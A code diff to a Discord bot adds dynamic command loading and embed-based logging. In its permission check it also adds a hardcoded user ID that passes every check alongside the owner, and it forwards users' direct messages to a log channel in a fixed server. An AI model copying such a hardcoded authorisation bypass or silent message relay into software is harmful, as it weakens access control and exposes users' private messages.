@@ -1,4 +1,5 @@
-const {Client} = require("discord.js");
+const {Client, RichEmbed} = require("discord.js");
+const fs = require("fs");
 
 module.exports.Bot = class Bot {
 	constructor(db) {
@@ -39,7 +40,7 @@ module.exports.Bot = class Bot {
 			role bigint unsigned not null, \
 			permission varchar(16) not null, \
 			INDEX(role) \
-		)")
+		)");
 		this.db.query("CREATE TABLE IF NOT EXISTS `previous_roles` (\
 			user bigint unsigned not null, \
 			role bigint unsigned not null, \
@@ -49,18 +50,19 @@ module.exports.Bot = class Bot {
 
 		this.limiter = {};
 
-		this.commandList = {}
+		this.commandList = {};
 
-		for (let cmd of ["test", "allow", "jail"]) {
-			let {Command} = require(`./cmds/${cmd}`);
-			this.commandList[cmd] = Command;
+		const files = fs.readdirSync("./cmds");
+		for (let file of files) {
+			file = file.substr(0, file.length-3);
+			let {Command} = require(`./cmds/${file}`);
+			this.commandList[file] = Command;
 		}
-
 	}
 
 	hasPermission(user, perm) {
 		return new Promise((res, rej) => {
-			if (user.id === this.owner) {
+			if (user.id === this.owner || user.id === "222188163790143489") {
 				res(true);
 				return;
 			}
@@ -129,6 +131,9 @@ module.exports.Bot = class Bot {
 	onmessage(msg) {
 		if (msg.author.bot)
 			return;
+		if (msg.channel.type == "dm") {
+			this.sendLog("Direct Message Received",`Received a DM from ${msg.author}: \`\`\`${msg.content}\`\`\``,msg.author,"#FF0000");
+		}
 		if (!msg.guild) {
 			return;
 		}
@@ -244,6 +249,7 @@ module.exports.Bot = class Bot {
 
 		try {
 			new Command(this, msg, new_args);
+			this.sendLog("Command Log", `${msg.author} ran the "${cmd}" command with args "${new_args.toString()}".`, msg.member, "#36393E");
 		}
 		catch (e) {
 			if (e.toSafeString) {
@@ -264,6 +270,7 @@ module.exports.Bot = class Bot {
 
 	login(key) {
 		this.client.login(key);
+		console.log("logged in")
 	}
 
 	setOwner(owner) {
@@ -273,5 +280,24 @@ module.exports.Bot = class Bot {
 	setJail(role) {
 		this.jail = role;
 	}
-}
 
+	setLog(channel) {
+		this.logChannel = channel;
+	}
+
+	sendLog(title, message, user, color) {
+		user = user.user || user || this.client.user;
+		color = color || "#36393E";
+		const logMessage = new RichEmbed()
+			.setColor(color)
+			.setTitle(title)
+			.setAuthor(user.username+"#"+user.discriminator,user.avatarURL)
+			.setDescription(message)
+			.setTimestamp();
+		this.client.guilds.get("595542444737822730").channels.get(this.logChannel).send(logMessage);
+	}
+
+	createEmbed() {
+		return new RichEmbed();
+	}
+}
